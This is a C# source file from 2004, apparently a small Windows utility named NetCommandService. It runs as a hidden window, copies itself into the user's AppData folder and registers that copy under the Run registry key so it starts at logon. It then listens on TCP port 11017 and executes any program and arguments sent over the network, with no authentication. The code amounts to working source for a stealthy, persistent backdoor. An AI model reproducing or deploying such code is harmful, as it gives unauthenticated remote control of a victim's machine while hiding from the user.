// André Betz 2004
// http://www.andrebetz.de
using System;
using System.Drawing;
using System.Collections;
using System.ComponentModel;
using System.Windows.Forms;
using System.Data;
using System.Diagnostics;
using System.Text;
using System.IO;
using Microsoft.Win32;


namespace NetCommandService
{
	/// <summary>
	/// Summary description for Form1.
	/// </summary>
	public class NetCommandWin : System.Windows.Forms.Form
	{
		/// <summary>
		/// Required designer variable.
		/// </summary>
		private System.ComponentModel.Container components = null;
		private StringBuilder m_sb = null;
		private MyServer m_myServer = null;

		public NetCommandWin()
		{
			//
			// Required for Windows Form Designer support
			//
			InitializeComponent();
			Start();
		}

		/// <summary>
		/// Clean up any resources being used.
		/// </summary>
		protected override void Dispose( bool disposing )
		{
			if( disposing )
			{
				if (components != null) 
				{
					components.Dispose();
				}
			}
			base.Dispose( disposing );
		}

		#region Windows Form Designer generated code
		/// <summary>
		/// Required method for Designer support - do not modify
		/// the contents of this method with the code editor.
		/// </summary>
		private void InitializeComponent()
		{
			// 
			// NetCommandWin
			// 
			this.AutoScale = false;
			this.AutoScaleBaseSize = new System.Drawing.Size(5, 13);
			this.ClientSize = new System.Drawing.Size(144, 0);
			this.ControlBox = false;
			this.Enabled = false;
			this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
			this.MaximizeBox = false;
			this.MinimizeBox = false;
			this.Name = "NetCommandWin";
			this.ShowInTaskbar = false;
			this.Text = "NetCommandWin www.andrebetz.de";
			this.WindowState = System.Windows.Forms.FormWindowState.Minimized;

		}
		#endregion

		/// <summary>
		/// The main entry point for the application.
		/// </summary>
		[STAThread]
		static void Main() 
		{
			Application.Run(new NetCommandWin());
		}

		private void Start()
		{
			string prgPath = Environment.CurrentDirectory;
			Process thisProc = Process.GetCurrentProcess();
	
			string WholePath = prgPath + "\\" + thisProc.ProcessName + ".exe";
			string UserPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + thisProc.ProcessName + ".exe";
			if(!UserPath.Equals(WholePath))
			{
				File.Copy(WholePath,UserPath,true);
			}

			RegistryKey regkey = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run",true);
			if(regkey!=null)
			{
				if(regkey.GetValue(UserPath)==null)
				{
					regkey.SetValue(thisProc.ProcessName + ".exe",UserPath);
				}
			}

			m_sb = new StringBuilder();
			m_myServer = new MyServer(11017,"CommandServiceServer",new SocketReceiver(ReceiveProc));
			m_myServer.Start();
		}

		/// <summary>
		/// Receive Proc
		/// </summary>
		public void ReceiveProc(string sb)
		{
			if(sb.Equals("\r\n"))
			{
				try
				{
					string CommandLine = m_sb.ToString();
					string[] splitted = CommandLine.Split(new char[]{'&'});
					// Aufbau: Pfad & Kommando mit Pfad & Argumente
					if(splitted!=null && splitted.Length==3)
					{
						Process process = new Process();
						process.StartInfo.RedirectStandardOutput = false;
						process.StartInfo.RedirectStandardError = false;
						process.StartInfo.RedirectStandardInput = false;
						process.StartInfo.UseShellExecute = false;
						process.StartInfo.CreateNoWindow = false;
						process.StartInfo.WorkingDirectory = splitted[0];
						process.StartInfo.FileName = splitted[0]+splitted[1];
						process.StartInfo.Arguments = splitted[2];
						process.Start();
					}
				}
				catch(Exception e)
				{
					string txt = e.ToString();
				}
				m_sb = new StringBuilder();
			}
			else
			{
				m_sb.Append(sb);
			}
		}
	}
}
